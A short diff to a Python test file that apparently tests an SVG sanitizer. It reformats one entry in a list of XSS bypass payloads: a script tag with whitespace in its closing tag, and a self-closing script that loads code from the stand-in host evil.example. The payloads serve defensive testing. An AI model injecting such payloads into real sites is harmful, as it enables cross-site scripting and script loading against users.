@@ -103,8 +103,7 @@ def test_sanitize_theme_tokens_with_svg():
 # while browsers accept several HTML5 variants as valid script end tags.
 SVG_XSS_BYPASS_PAYLOADS = [
     # Trailing whitespace in the closing tag.
-    '<svg xmlns="http://www.w3.org/2000/svg" width="70">'
-    "<script>alert(1)</script >",
+    '<svg xmlns="http://www.w3.org/2000/svg" width="70"><script>alert(1)</script >',
     # Self-closing script with an external src via ``href``.
     '<svg xmlns="http://www.w3.org/2000/svg">'
     '<script href="https://evil.example/x.js"/></svg>',
